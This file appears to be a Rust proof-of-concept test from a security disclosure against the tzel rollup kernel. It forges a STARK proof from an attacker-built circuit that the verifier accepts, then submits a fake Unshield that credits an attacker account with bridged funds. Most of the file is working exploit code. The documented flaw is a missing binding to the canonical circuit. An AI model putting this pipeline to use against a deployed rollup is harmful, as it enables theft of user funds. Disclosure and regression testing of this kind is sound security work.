//! End-to-end proof-of-concept: the rollup kernel applies a forged Unshield
//! whose STARK bundle was produced entirely outside tzel's canonical
//! prover pipeline.
//!
//! # Toolchain
//!
//! The `circuit-prover` dev-dep requires unstable Rust features
//! (`array_chunks_mut`). The `+nightly-2025-07-14` prefix is REQUIRED on
//! all `cargo` invocations below because this crate has no local
//! `rust-toolchain.toml` (only `apps/prover/rust-toolchain.toml` pins
//! that channel and it is not inherited here).
//!
//! # What this test demonstrates
//!
//! Phase 2-4 of this disclosure showed that `tzel_verifier::ProofBundle::verify()`
//! (see `verifier/src/bundle.rs:113`) returns `Ok(())` for a bundle whose
//! `VerifyMeta`, preprocessed root, and STARK proof are all produced by an
//! attacker against an attacker-chosen custom circuit (see
//! `verifier/tests/canonical_binding_bypass.rs`). `output_preimage[2]` (the
//! "program hash" the kernel trusts) is never inspected by the bundle-level
//! verifier; `VerifyMeta` is reconstructed from attacker-controlled bytes;
//! and the circuit's preprocessed root is never pinned to a canonical one.
//!
//! The implication was spelled out but not shipped as a working artifact:
//! the rollup kernel will accept such a bundle as a legitimate Unshield.
//!
//! This test makes that implication concrete. It:
//!
//! 1. Stands up the real kernel test harness (same `TestHost` and
//!    `run_with_host` path used by `tezos/rollup-kernel/tests/bridge_flow.rs::
//!    verified_bridge_roundtrip_uses_checked_in_real_proofs`).
//! 2. Configures the kernel's verifier with the canonical program hashes
//!    + auth_domain from `tezos/rollup-kernel/testdata/verified_bridge_flow.json`
//!    (the fixture is the "ground truth" for what a deployed tzel rollup
//!    would be configured with).
//! 3. Runs Deposit + Shield from the fixture so the kernel has a populated
//!    note tree and a non-trivial valid root.
//! 4. Builds an *attacker* `KernelInboxMessage::Unshield` using the same
//!    attack pipeline as `canonical_binding_bypass.rs`:
//!      - `output_preimage` shaped per `apply_unshield` (14 felts for n=1
//!        nullifier), carrying the canonical unshield program hash, the
//!        real fixture auth_domain, a historical root already in the
//!        kernel (the post-shield root = `fixture.transfer.root`), a fresh
//!        nullifier nobody has spent, an attacker-chosen recipient string,
//!        an attacker-chosen amount, and an attacker-chosen `cm_fee`.
//!      - `VerifyMeta` materialized from an attacker-proved custom circuit
//!        whose first two `output` gates emit the Blake2 hash of the
//!        attacker preimage.
//! 5. Submits the forged Unshield through the normal inbox path.
//! 6. Runs the kernel.
//! 7. Asserts:
//!      - `KernelResult::Unshield { .. }` (not an error).
//!      - The nullifier is now in the kernel's nullifier set.
//!      - The attacker's recipient string has a positive public balance.
//!      - A note (the `cm_fee` note) was appended to the tree.
//! 8. Demonstrates the end-to-end real-world impact by issuing a subsequent
//!    `KernelInboxMessage::Withdraw` for the attacker's recipient. The
//!    kernel emits a Tezos outbox `burn` message — the forged funds are
//!    now exiting to L1.
//!
//! # Running
//!
//! In debug mode (matches the CI invocation for `bridge_flow`; the kernel's
//! admin-key helpers fall back to dev keys under `cfg(debug_assertions)`):
//!
//! ```ignore
//! cargo +nightly-2025-07-14 test -p tzel-rollup-kernel \
//!     --test e2e_verifier_binding_bypass -- --nocapture
//! ```
//!
//! In release mode (faster, but `cfg(debug_assertions)` is off, so the
//! dev admin-key env vars must be set — the values below are the ones
//! produced by `dev_config_admin_ask()` = `hash(b"tzel-dev-rollup-config-admin")`):
//!
//! ```ignore
//! TZEL_ROLLUP_CONFIG_ADMIN_PUB_SEED_HEX=ce29748d82bfaea9bc847a797798a7216c07548cc5b3cdb9d7a321250e6ae905 \
//! TZEL_ROLLUP_VERIFIER_CONFIG_ADMIN_LEAF_HEX=df8140bb21671e80e79edda81bb4094a849213cac0094ac2614eaf29d6bed005 \
//! TZEL_ROLLUP_BRIDGE_CONFIG_ADMIN_LEAF_HEX=42d92056ee6ca0b3ee4ffc522657b9981244545de8f6879b7f08a5f7ee41ef02 \
//!   cargo +nightly-2025-07-14 test -p tzel-rollup-kernel \
//!     --test e2e_verifier_binding_bypass --release -- --nocapture
//! ```

// Note: this test is gated on `feature = "proof-verifier"` (enabled by
// default in `tezos/rollup-kernel/Cargo.toml`). Running with
// `--no-default-features` compiles it to empty and reports `0 passed` —
// that is a silent pass, not a confirmed bypass. Always run with the
// default features enabled.
#![cfg(feature = "proof-verifier")]

use std::collections::{HashMap, VecDeque};
use std::sync::OnceLock;

use serde::Deserialize;
use tezos_data_encoding_05::enc::BinWriter as _;
use tezos_smart_rollup_encoding::{
    contract::Contract as TezosContract,
    inbox::{
        ExternalMessageFrame, InboxMessage as TezosInboxMessage,
        InternalInboxMessage as TezosInternalInboxMessage, Transfer as TezosTransfer,
    },
    michelson::{
        ticket::FA2_1Ticket, MichelsonBytes, MichelsonInt, MichelsonOption, MichelsonPair,
        MichelsonUnit,
    },
    public_key_hash::PublicKeyHash,
    smart_rollup::SmartRollupAddress,
};

// Attacker's STARK pipeline (dev-deps pulled through the rollup-kernel Cargo.toml):
use circuit_air::statement::{all_circuit_components, INTERACTION_POW_BITS};
use circuit_common::preprocessed::PreprocessedCircuit;
use circuit_prover::prover::{
    prepare_circuit_proof_for_circuit_verifier, prove_circuit_assignment, BaseColumnPool,
    SimdBackend,
};
use circuit_serialize::serialize::CircuitSerialize as _;
use circuits::blake::HashValue;
use circuits::context::{Context, TraceContext};
use circuits::ivalue::{qm31_from_u32s, IValue as _};
use circuits::ops::{guess, output};
use circuits_stark_verifier::proof::ProofConfig;
use circuits_stark_verifier::proof_from_stark_proof::pack_into_qm31s;
use starknet_types_core::felt::Felt;
use starknet_types_core::hash::Blake2Felt252;
use stwo::core::fields::m31::M31;
use stwo::core::fields::qm31::QM31;

use tzel_core::kernel_wire::{
    encode_kernel_inbox_message, sign_kernel_bridge_config, sign_kernel_verifier_config,
    KernelBridgeConfig, KernelInboxMessage, KernelResult, KernelShieldReq, KernelStarkProof,
    KernelUnshieldReq, KernelVerifierConfig, KernelWithdrawReq,
};
use tzel_core::{
    deposit_balance_key, hash, EncryptedNote, ProgramHashes, Proof, ShieldReq, TransferReq,
    UnshieldReq, ENCRYPTED_NOTE_BYTES, F, MIN_TX_FEE, ML_KEM768_CIPHERTEXT_BYTES,
    NOTE_AEAD_NONCE_BYTES, ZERO,
};
use tzel_rollup_kernel::{
    read_last_result, read_ledger, run_with_host, DalParameters, Host, InputMessage,
    MAX_INPUT_BYTES,
};
use tzel_verifier::{encode_verify_meta, ProofBundle, VerifyMeta};

// ─────────────────────────────────────────────────────────────────────
// TestHost — a faithful copy of bridge_flow.rs::TestHost
// (same host trait impl, same store semantics, same rollup address).
// We copy rather than share because bridge_flow.rs is an integration
// test file and doesn't expose the type.
// ─────────────────────────────────────────────────────────────────────

const PATH_BRIDGE_TICKETER: &[u8] = b"/tzel/v1/state/bridge/ticketer";
const PATH_WITHDRAWAL_PREFIX: &[u8] = b"/tzel/v1/state/withdrawals/index/";

#[derive(Clone, Default)]
struct TestHost {
    inputs: VecDeque<InputMessage>,
    store: HashMap<Vec<u8>, Vec<u8>>,
    outputs: Vec<Vec<u8>>,
    debug: String,
    dal_parameters: Option<DalParameters>,
    dal_pages: HashMap<(i32, u8, u16), Vec<u8>>,
}

impl TestHost {
    fn push_input(&mut self, level: i32, id: i32, payload: Vec<u8>) {
        self.inputs.push_back(InputMessage { level, id, payload });
    }
}

impl Host for TestHost {
    fn next_input(&mut self) -> Option<InputMessage> {
        self.inputs.pop_front()
    }

    fn read_store(&self, path: &[u8], max_bytes: usize) -> Option<Vec<u8>> {
        let value = self.store.get(path)?;
        Some(value[..value.len().min(max_bytes)].to_vec())
    }

    fn write_store(&mut self, path: &[u8], value: &[u8]) {
        self.store.insert(path.to_vec(), value.to_vec());
    }

    fn write_output(&mut self, value: &[u8]) -> Result<(), String> {
        self.outputs.push(value.to_vec());
        Ok(())
    }

    fn write_debug(&mut self, message: &str) {
        self.debug.push_str(message);
    }

    fn rollup_address(&self) -> Vec<u8> {
        sample_rollup_address().hash().as_ref().clone()
    }

    fn reveal_dal_parameters(&self) -> Result<DalParameters, String> {
        self.dal_parameters
            .clone()
            .ok_or_else(|| "DAL is not configured in e2e test host".into())
    }

    fn reveal_dal_page(
        &self,
        published_level: i32,
        slot_index: u8,
        page_index: u16,
        max_bytes: usize,
    ) -> Result<Vec<u8>, String> {
        Ok(self
            .dal_pages
            .get(&(published_level, slot_index, page_index))
            .cloned()
            .unwrap_or_default()
            .into_iter()
            .take(max_bytes)
            .collect())
    }
}

fn sample_config_admin_ask() -> F {
    hash(b"tzel-dev-rollup-config-admin")
}

fn sample_l1_receiver() -> &'static str {
    "tz1KqTpEZ7Yob7QbPE4Hy4Wo8fHG8LhKxZSx"
}

fn sample_l1_source() -> PublicKeyHash {
    PublicKeyHash::from_b58check("tz1gjaF81ZRRvdzjobyfVNsAeSC6PScjfQwN").unwrap()
}

fn sample_rollup_address() -> SmartRollupAddress {
    SmartRollupAddress::from_b58check("sr1UNDWPUYVeomgG15wn5jSw689EJ4RNnVQa").unwrap()
}

fn encode_external_kernel_message(message: KernelInboxMessage) -> Vec<u8> {
    let payload = encode_kernel_inbox_message(&message).unwrap();
    let mut framed = Vec::new();
    ExternalMessageFrame::Targetted {
        address: sample_rollup_address(),
        contents: payload.as_slice(),
    }
    .bin_write(&mut framed)
    .unwrap();
    let mut bytes = Vec::new();
    TezosInboxMessage::<MichelsonUnit>::External(framed.as_slice())
        .serialize(&mut bytes)
        .unwrap();
    bytes
}

fn encode_custom_ticket_deposit_message(
    recipient: Vec<u8>,
    amount: u64,
    creator_ticketer: &str,
    sender_ticketer: &str,
    token_id: i32,
    metadata: Option<Vec<u8>>,
) -> Vec<u8> {
    let creator = TezosContract::from_b58check(creator_ticketer).unwrap();
    let sender_contract = TezosContract::from_b58check(sender_ticketer).unwrap();
    let sender = match sender_contract {
        TezosContract::Originated(kt1) => kt1,
        TezosContract::Implicit(_) => panic!("ticketer must be KT1"),
    };
    let payload = MichelsonPair(
        MichelsonBytes(recipient),
        FA2_1Ticket::new(
            creator,
            MichelsonPair(
                MichelsonInt::from(token_id),
                MichelsonOption(metadata.map(MichelsonBytes)),
            ),
            amount,
        )
        .unwrap(),
    );
    let transfer = TezosTransfer {
        payload,
        sender,
        source: sample_l1_source(),
        destination: sample_rollup_address(),
    };
    let mut bytes = Vec::new();
    TezosInboxMessage::Internal(TezosInternalInboxMessage::Transfer(transfer))
        .serialize(&mut bytes)
        .unwrap();
    bytes
}

// ─────────────────────────────────────────────────────────────────────
// Fixture — same JSON used by the real verified-bridge kernel tests.
// We ship a minimal Deserialize struct that only pulls the fields we
// actually need. The file is parsed via `include_str!` to avoid a
// filesystem dependency at runtime.
// ─────────────────────────────────────────────────────────────────────

#[derive(Clone, Deserialize)]
struct VerifiedBridgeFixture {
    #[serde(with = "tzel_core::hex_f")]
    auth_domain: F,
    program_hashes: ProgramHashes,
    bridge_ticketer: String,
    shield: ShieldReq,
    transfer: TransferReq,
    #[allow(dead_code)]
    unshield: UnshieldReq,
}

fn verified_bridge_fixture() -> &'static VerifiedBridgeFixture {
    static FIXTURE: OnceLock<VerifiedBridgeFixture> = OnceLock::new();
    FIXTURE.get_or_init(|| {
        serde_json::from_str(include_str!("../testdata/verified_bridge_flow.json"))
            .expect("valid verified bridge fixture")
    })
}

fn kernel_proof_from_fixture(proof: &Proof) -> KernelStarkProof {
    match proof {
        Proof::Stark {
            proof_bytes,
            output_preimage,
            verify_meta,
        } => KernelStarkProof {
            proof_bytes: proof_bytes.clone(),
            output_preimage: output_preimage.clone(),
            verify_meta: verify_meta
                .clone()
                .expect("fixture Stark proof verify_meta"),
        },
        Proof::TrustMeBro => panic!("fixture should contain real Stark proofs"),
    }
}

fn kernel_shield_req_from_fixture(req: &ShieldReq) -> KernelShieldReq {
    KernelShieldReq {
        deposit_id: req.deposit_id,
        v: req.v,
        fee: req.fee,
        producer_fee: req.producer_fee,
        address: req.address.clone(),
        memo: req.memo.clone(),
        proof: kernel_proof_from_fixture(&req.proof),
        client_cm: req.client_cm,
        client_enc: req.client_enc.clone(),
        producer_cm: req.producer_cm,
        producer_enc: req.producer_enc.clone(),
    }
}

fn signed_bridge_message(config: KernelBridgeConfig) -> KernelInboxMessage {
    KernelInboxMessage::ConfigureBridge(
        sign_kernel_bridge_config(&sample_config_admin_ask(), config).unwrap(),
    )
}

fn signed_verifier_message(config: KernelVerifierConfig) -> KernelInboxMessage {
    KernelInboxMessage::ConfigureVerifier(
        sign_kernel_verifier_config(&sample_config_admin_ask(), config).unwrap(),
    )
}

fn configure_verified_bridge(host: &mut TestHost, fixture: &VerifiedBridgeFixture) {
    host.push_input(
        0,
        0,
        encode_external_kernel_message(signed_verifier_message(KernelVerifierConfig {
            auth_domain: fixture.auth_domain,
            verified_program_hashes: fixture.program_hashes.clone(),
        })),
    );
    host.push_input(
        1,
        0,
        encode_external_kernel_message(signed_bridge_message(KernelBridgeConfig {
            ticketer: fixture.bridge_ticketer.clone(),
        })),
    );
    run_with_host(host);
}

fn apply_fixture_deposit(host: &mut TestHost, fixture: &VerifiedBridgeFixture, level: i32) {
    host.push_input(
        level,
        0,
        encode_custom_ticket_deposit_message(
            deposit_balance_key(&fixture.shield.deposit_id).into_bytes(),
            fixture.shield.v + fixture.shield.fee + fixture.shield.producer_fee,
            &fixture.bridge_ticketer,
            &fixture.bridge_ticketer,
            0,
            None,
        ),
    );
    run_with_host(host);
}

fn apply_fixture_shield(host: &mut TestHost, fixture: &VerifiedBridgeFixture, level: i32) {
    host.push_input(
        level,
        0,
        encode_external_kernel_message(KernelInboxMessage::Shield(kernel_shield_req_from_fixture(
            &fixture.shield,
        ))),
    );
    run_with_host(host);
}

fn indexed_path(prefix: &[u8], index: u64) -> Vec<u8> {
    let mut path = Vec::with_capacity(prefix.len() + 16);
    path.extend_from_slice(prefix);
    path.extend_from_slice(format!("{:016x}", index).as_bytes());
    path
}

// ─────────────────────────────────────────────────────────────────────
// Attacker STARK pipeline — ported verbatim from
// `verifier/tests/canonical_binding_bypass.rs`. Specialized at the end
// for the Unshield preimage shape.
// ─────────────────────────────────────────────────────────────────────

const FELT252_N_WORDS: usize = 28;
const FELT252_BITS_PER_WORD: usize = 9;

fn felt252_to_m31_words(value: Felt) -> [M31; FELT252_N_WORDS] {
    let limbs = value.to_le_digits();
    std::array::from_fn(|index| {
        let mask = (1u64 << FELT252_BITS_PER_WORD) - 1;
        let shift = FELT252_BITS_PER_WORD * index;
        let low_limb = shift / 64;
        let shift_low = shift & 0x3f;
        let high_limb = (shift + FELT252_BITS_PER_WORD - 1) / 64;
        let word = if low_limb == high_limb {
            (limbs[low_limb] >> shift_low) & mask
        } else {
            ((limbs[low_limb] >> shift_low) | (limbs[high_limb] << (64 - shift_low))) & mask
        };
        M31::from(word as u32)
    })
}

fn compute_output_hash_values(output_preimage: &[Felt]) -> Vec<u32> {
    let outputs = Blake2Felt252::encode_felt252_data_and_calc_blake_hash(output_preimage);
    let outputs = felt252_to_m31_words(outputs);
    let output_qm31s = pack_into_qm31s(outputs.into_iter());
    let output_hash: HashValue<QM31> =
        QM31::blake(output_qm31s.as_slice(), output_qm31s.len() * 16);
    qm31_to_m31s(output_hash.0)
        .into_iter()
        .chain(qm31_to_m31s(output_hash.1))
        .collect()
}

fn qm31_to_m31s(q: QM31) -> [u32; 4] {
    [q.0 .0 .0, q.0 .1 .0, q.1 .0 .0, q.1 .1 .0]
}

/// Build a Context whose first two `output` gates emit our target values.
/// See `verifier/tests/canonical_binding_bypass.rs::build_attacker_context`
/// for the full rationale (lookup-sum balancing etc.).
fn build_attacker_context(target_output_qm31s: [QM31; 2]) -> TraceContext {
    let mut context = Context::<QM31>::default();

    const N: usize = 1030;

    let (mut a, mut b) = (
        guess(&mut context, qm31_from_u32s(0, 0, 0, 0)),
        guess(&mut context, qm31_from_u32s(1, 0, 0, 0)),
    );
    for _ in 2..N {
        (a, b) = (b, circuits::eval!(&mut context, (a) + (b)));
    }
    let target0 = context.constant(target_output_qm31s[0]);
    let b_minus_b = circuits::eval!(&mut context, (b) - (b));
    let out0 = circuits::eval!(&mut context, (b_minus_b) + (target0));
    output(&mut context, out0);

    let (mut c, mut d) = (
        guess(&mut context, qm31_from_u32s(0, 0, 0, 0)),
        guess(&mut context, qm31_from_u32s(2, 0, 0, 0)),
    );
    for _ in 2..N {
        (c, d) = (d, circuits::eval!(&mut context, (c) + (d)));
    }
    let target1 = context.constant(target_output_qm31s[1]);
    let d_minus_d = circuits::eval!(&mut context, (d) - (d));
    let out1 = circuits::eval!(&mut context, (d_minus_d) + (target1));
    output(&mut context, out1);

    context
}

fn pack_proof_bytes(proof: &circuits_stark_verifier::proof::Proof<QM31>) -> Vec<u8> {
    let mut serialized = Vec::new();
    proof.serialize(&mut serialized);
    zstd::encode_all(serialized.as_slice(), 0).expect("zstd compress")
}

fn build_verify_meta(
    proof_config: &ProofConfig,
    circuit_pcs_config: &stwo::core::pcs::PcsConfig,
    output_addresses: &[usize],
    n_blake_gates: usize,
    preprocessed_column_ids: &[stwo_constraint_framework::preprocessed_columns::PreProcessedColumnId],
    preprocessed_root: &HashValue<QM31>,
    public_output_qm31s: &[QM31],
) -> VerifyMeta {
    let preprocessed_root_flat: Vec<u32> = qm31_to_m31s(preprocessed_root.0)
        .into_iter()
        .chain(qm31_to_m31s(preprocessed_root.1))
        .collect();

    let public_output_values: Vec<u32> = public_output_qm31s
        .iter()
        .flat_map(|q| qm31_to_m31s(*q))
        .collect();

    VerifyMeta {
        n_pow_bits: proof_config.n_proof_of_work_bits,
        n_preprocessed_columns: proof_config.n_preprocessed_columns,
        n_trace_columns: proof_config.n_trace_columns,
        n_interaction_columns: proof_config.n_interaction_columns,
        trace_columns_per_component: proof_config.trace_columns_per_component.clone(),
        interaction_columns_per_component: proof_config.interaction_columns_per_component.clone(),
        cumulative_sum_columns: proof_config.cumulative_sum_columns.clone(),
        n_components: proof_config.n_components,
        fri_log_trace_size: proof_config.fri.log_trace_size,
        fri_log_blowup: proof_config.fri.log_blowup_factor as u32,
        fri_log_last_layer: proof_config.fri.log_n_last_layer_coefs as u32,
        fri_n_queries: proof_config.fri.n_queries,
        fri_fold_step: proof_config.fri.fold_step as u32,
        interaction_pow_bits: proof_config.interaction_pow_bits,
        circuit_pow_bits: circuit_pcs_config.pow_bits,
        circuit_fri_log_blowup: circuit_pcs_config.fri_config.log_blowup_factor,
        circuit_fri_log_last_layer: circuit_pcs_config.fri_config.log_last_layer_degree_bound,
        circuit_fri_n_queries: circuit_pcs_config.fri_config.n_queries,
        circuit_fri_fold_step: circuit_pcs_config.fri_config.fold_step,
        circuit_lifting: circuit_pcs_config.lifting_log_size,
        output_addresses: output_addresses.to_vec(),
        n_blake_gates,
        preprocessed_column_ids: preprocessed_column_ids
            .iter()
            .map(|id| id.id.to_string())
            .collect(),
        preprocessed_root: preprocessed_root_flat,
        public_output_values,
    }
}

/// End-to-end attacker proof for a given `output_preimage`.
/// Returns `(proof_bytes, verify_meta_bytes)` ready to drop into a
/// `KernelStarkProof`. Also returns the preimage as `Vec<F>` (tzel wire
/// format) for convenience.
fn build_attacker_kernel_proof(
    attacker_chosen_preimage: Vec<Felt>,
) -> (Vec<u8>, Vec<u8>, Vec<F>) {
    // Step 1: compute the Blake2 hash the bundle will expect.
    let expected_output_hash_flat = compute_output_hash_values(&attacker_chosen_preimage);
    assert_eq!(
        expected_output_hash_flat.len(),
        8,
        "Blake2 hash packs to 8 u32 (= 2 QM31)",
    );

    let target_output_qm31s: [QM31; 2] = [
        QM31::from_m31(
            M31::from(expected_output_hash_flat[0]),
            M31::from(expected_output_hash_flat[1]),
            M31::from(expected_output_hash_flat[2]),
            M31::from(expected_output_hash_flat[3]),
        ),
        QM31::from_m31(
            M31::from(expected_output_hash_flat[4]),
            M31::from(expected_output_hash_flat[5]),
            M31::from(expected_output_hash_flat[6]),
            M31::from(expected_output_hash_flat[7]),
        ),
    ];

    // Step 2: attacker builds + proves their own circuit.
    let mut context = build_attacker_context(target_output_qm31s);
    context.finalize_guessed_vars();

    let preprocessed_circuit = PreprocessedCircuit::preprocess_circuit(&mut context);
    let output_addresses = preprocessed_circuit.params.output_addresses.clone();
    let n_blake_gates = preprocessed_circuit.params.n_blake_gates;
    let preprocessed_column_ids = preprocessed_circuit.preprocessed_trace.ids();

    context.circuit.check_yields();
    assert!(
        context.is_circuit_valid(),
        "circuit values must satisfy all gate constraints",
    );

    let circuit_proof = prove_circuit_assignment(
        context.values(),
        &preprocessed_circuit,
        &BaseColumnPool::<SimdBackend>::new(),
    );
    assert!(
        circuit_proof.stark_proof.is_ok(),
        "prover must succeed on attacker context",
    );
    assert_eq!(circuit_proof.claim.output_values.len(), 4);
    assert_eq!(circuit_proof.claim.output_values[0], target_output_qm31s[0]);
    assert_eq!(circuit_proof.claim.output_values[1], target_output_qm31s[1]);

    let preprocessed_root_hv: HashValue<QM31> = circuit_proof
        .stark_proof
        .as_ref()
        .expect("stark proof ok")
        .proof
        .commitments[0]
        .into();
    let circuit_pcs_config = circuit_proof.pcs_config;
    let public_output_qm31s: Vec<QM31> = circuit_proof.claim.output_values.clone();

    let proof_config = ProofConfig::from_components(
        &all_circuit_components::<QM31>(),
        preprocessed_column_ids.len(),
        &circuit_pcs_config,
        INTERACTION_POW_BITS,
    );

    let (proof, _public_data) =
        prepare_circuit_proof_for_circuit_verifier(circuit_proof, &proof_config);

    // Step 4: wire-format the bundle pieces.
    let proof_bytes = pack_proof_bytes(&proof);

    let verify_meta = build_verify_meta(
        &proof_config,
        &circuit_pcs_config,
        &output_addresses,
        n_blake_gates,
        &preprocessed_column_ids,
        &preprocessed_root_hv,
        &public_output_qm31s,
    );
    assert_eq!(
        &verify_meta.public_output_values[..expected_output_hash_flat.len()],
        expected_output_hash_flat.as_slice(),
        "self-consistency: public_output_values must match hash-of-preimage",
    );

    // Sanity cross-check with the bundle's own verify() — the kernel's
    // `DirectProofVerifier::validate` will reconstruct this same bundle
    // and call the same verify() under the hood. If this fails, the kernel
    // path will fail too, so we catch the problem locally.
    let output_preimage_raw: Vec<[u8; 32]> = attacker_chosen_preimage
        .iter()
        .map(Felt::to_bytes_le)
        .collect();
    let bundle = ProofBundle::from_output_parts(
        proof_bytes.clone(),
        output_preimage_raw.clone(),
        verify_meta.clone(),
    );
    bundle
        .verify()
        .expect("sanity: bundle.verify() must accept the attacker bundle");

    let verify_meta_bytes =
        encode_verify_meta(&verify_meta).expect("verify_meta encodes to bytes");

    (proof_bytes, verify_meta_bytes, output_preimage_raw)
}

// ─────────────────────────────────────────────────────────────────────
// Unshield preimage construction (fixed-width layout).
//
// `apply_unshield` (see `core/src/lib.rs:1965`) reads the final
// `tail_len = 2 + n + 7` felts of `output_preimage`. For n=1 nullifier
// (the simplest case), `tail_len = 10` and the tail is:
//
//   tail[0] = auth_domain
//   tail[1] = root
//   tail[2] = nullifier_0
//   tail[3] = u64_to_felt(v_pub)
//   tail[4] = u64_to_felt(fee)
//   tail[5] = hash(recipient.as_bytes())
//   tail[6] = cm_change
//   tail[7] = memo_ct_hash_change  (zero if no change note)
//   tail[8] = cm_fee
//   tail[9] = memo_ct_hash_fee     (= memo_ct_hash(&req.enc_fee))
//
// `validate_stark_circuit` (see `verifier/src/lib.rs:120`) additionally
// requires:
//   - preimage[0] == 1           (bootloader n_tasks)
//   - preimage[1] == task_output_size, and
//     preimage.len() == 1 + task_output_size
//   - preimage[2] == canonical unshield program hash
// For a 14-felt preimage we therefore set task_output_size = 13, which
// leaves exactly the tail layout above at indices [4..14], with index
// [3] available as a filler (apply_unshield does not read it).
// ─────────────────────────────────────────────────────────────────────

fn zero_shaped_encrypted_note() -> EncryptedNote {
    EncryptedNote {
        ct_d: vec![0u8; ML_KEM768_CIPHERTEXT_BYTES],
        tag: 0,
        ct_v: vec![0u8; ML_KEM768_CIPHERTEXT_BYTES],
        nonce: vec![0u8; NOTE_AEAD_NONCE_BYTES],
        encrypted_data: vec![0u8; ENCRYPTED_NOTE_BYTES],
    }
}

fn felt_from_raw(raw: F) -> Felt {
    Felt::from_bytes_le(&raw)
}

fn raw_from_u64_felt(v: u64) -> F {
    tzel_core::u64_to_felt(v)
}

/// Parameters that together fully specify the attacker-forged Unshield.
/// Everything here is attacker-controlled except `program_hash` (copied
/// from the fixture — what a deployed tzel rollup would be configured
/// with) and `auth_domain` (same).
struct AttackerUnshieldInputs {
    auth_domain: F,
    canonical_unshield_program_hash: F,
    root: F,
    nullifier: F,
    v_pub: u64,
    fee: u64,
    recipient: String,
    cm_fee: F,
    enc_fee: EncryptedNote,
}

fn build_attacker_unshield_req(inputs: AttackerUnshieldInputs) -> KernelUnshieldReq {
    let recipient_hash: F = hash(inputs.recipient.as_bytes());
    let memo_fee: F = tzel_core::memo_ct_hash(&inputs.enc_fee);

    // Assemble the 14-felt preimage. task_output_size = 13 means
    // parse_single_task_output_preimage will see a well-formed
    // 1-task bootloader output; program_hash at [2] satisfies
    // validate_stark_circuit; the tail from [4..14] satisfies the
    // apply_unshield tail checks.
    let preimage_felts: Vec<Felt> = vec![
        Felt::from(1u64),                                // [0]  n_tasks
        Felt::from(13u64),                               // [1]  task_output_size
        felt_from_raw(inputs.canonical_unshield_program_hash), // [2]  program hash
        Felt::from(0u64),                                // [3]  filler (unread)
        felt_from_raw(inputs.auth_domain),               // [4]  auth_domain
        felt_from_raw(inputs.root),                      // [5]  root
        felt_from_raw(inputs.nullifier),                 // [6]  nullifier_0
        felt_from_raw(raw_from_u64_felt(inputs.v_pub)),  // [7]  v_pub
        felt_from_raw(raw_from_u64_felt(inputs.fee)),    // [8]  fee
        felt_from_raw(recipient_hash),                   // [9]  hash(recipient)
        Felt::from(0u64),                                // [10] cm_change = 0 (no change)
        Felt::from(0u64),                                // [11] memo_ct_hash_change = 0
        felt_from_raw(inputs.cm_fee),                    // [12] cm_fee
        felt_from_raw(memo_fee),                         // [13] memo_ct_hash_fee
    ];
    assert_eq!(preimage_felts.len(), 14);

    // Run the attacker STARK pipeline.
    let (proof_bytes, verify_meta_bytes, output_preimage_raw) =
        build_attacker_kernel_proof(preimage_felts);
    assert_eq!(output_preimage_raw.len(), 14);

    let proof = KernelStarkProof {
        proof_bytes,
        output_preimage: output_preimage_raw,
        verify_meta: verify_meta_bytes,
    };

    KernelUnshieldReq {
        root: inputs.root,
        nullifiers: vec![inputs.nullifier],
        v_pub: inputs.v_pub,
        fee: inputs.fee,
        recipient: inputs.recipient,
        cm_change: ZERO,
        enc_change: None,
        cm_fee: inputs.cm_fee,
        enc_fee: inputs.enc_fee,
        proof,
    }
}

// ─────────────────────────────────────────────────────────────────────
// The actual e2e PoC.
// ─────────────────────────────────────────────────────────────────────

#[test]
fn kernel_accepts_forged_unshield_and_applies_state_mutations() {
    let fixture = verified_bridge_fixture();

    // ── Bring the kernel up to a realistic post-shield state. ─────────
    //
    // After this sequence the ledger has:
    //   - `valid_roots` containing both the empty-tree root and the
    //     post-shield root (which equals `fixture.transfer.root`).
    //   - `tree.leaves = [fixture.shield.client_cm, fixture.shield.producer_cm]`.
    //   - Zero nullifiers, zero public balances, zero withdrawals.
    let mut host = TestHost::default();
    configure_verified_bridge(&mut host, fixture);
    apply_fixture_deposit(&mut host, fixture, 2);
    apply_fixture_shield(&mut host, fixture, 3);

    // Sanity checks — if this is broken, the test assumptions are broken.
    match read_last_result(&host).expect("shield produced a result") {
        KernelResult::Shield(_) => (),
        other => panic!("pre-attack shield did not succeed: {:?}", other),
    }
    let pre_attack_ledger = read_ledger(&host).unwrap();
    assert!(
        pre_attack_ledger.valid_roots.contains(&fixture.transfer.root),
        "post-shield root must be valid (kernel uses this as the attacker's historical root)",
    );
    assert!(
        pre_attack_ledger.nullifiers.is_empty(),
        "pre-attack: no nullifiers yet",
    );
    let attacker_recipient = "attacker-drain-account";
    assert!(
        pre_attack_ledger.balances.get(attacker_recipient).is_none(),
        "pre-attack: attacker recipient has zero public balance",
    );

    // ── Build the forged Unshield. ────────────────────────────────────
    //
    // Nullifier is a fresh felt nobody owns. The root is the post-shield
    // root already in the ledger's valid_roots set. v_pub is the full
    // L1 bridge balance (but nothing constrains this — the attacker
    // could mint any value here because apply_unshield does NOT cross-
    // check `v_pub` against any deposit or note commitment).
    // Keep the top byte = 0 so the felt fits below the Stark field prime
    // and survives the round-trip through `Felt::from_bytes_le` /
    // `to_bytes_le` intact (the preimage the prover sees must match the
    // preimage the kernel reconstructs and tail-checks against `req.nullifiers`).
    let attacker_nullifier: F = {
        let mut n = [0u8; 32];
        for (i, byte) in n.iter_mut().enumerate().take(31) {
            *byte = 0xA0 ^ (i as u8);
        }
        n
    };
    let attacker_cm_fee: F = {
        let mut c = [0u8; 32];
        for (i, byte) in c.iter_mut().enumerate().take(31) {
            *byte = 0xC0 ^ (i as u8);
        }
        c
    };
    let drained_amount: u64 = fixture.shield.v; // 400_000 in the fixture.

    let req = build_attacker_unshield_req(AttackerUnshieldInputs {
        auth_domain: fixture.auth_domain,
        canonical_unshield_program_hash: fixture.program_hashes.unshield,
        root: fixture.transfer.root,
        nullifier: attacker_nullifier,
        v_pub: drained_amount,
        fee: MIN_TX_FEE,
        recipient: attacker_recipient.to_string(),
        cm_fee: attacker_cm_fee,
        enc_fee: zero_shaped_encrypted_note(),
    });

    // ── Submit it through the real inbox path. ────────────────────────
    host.push_input(
        4,
        0,
        encode_external_kernel_message(KernelInboxMessage::Unshield(req)),
    );
    run_with_host(&mut host);

    // ── Moment of truth: the kernel applied the forged Unshield. ──────
    let result = read_last_result(&host).expect("kernel produced a result");
    match &result {
        KernelResult::Unshield(_) => eprintln!(
            "[E2E PoC] kernel accepted forged Unshield: {:?}",
            result
        ),
        KernelResult::Error { message } => panic!(
            "kernel rejected the forged Unshield — the PoC is broken: {}",
            message
        ),
        other => panic!("unexpected rollup result for Unshield: {:?}", other),
    }

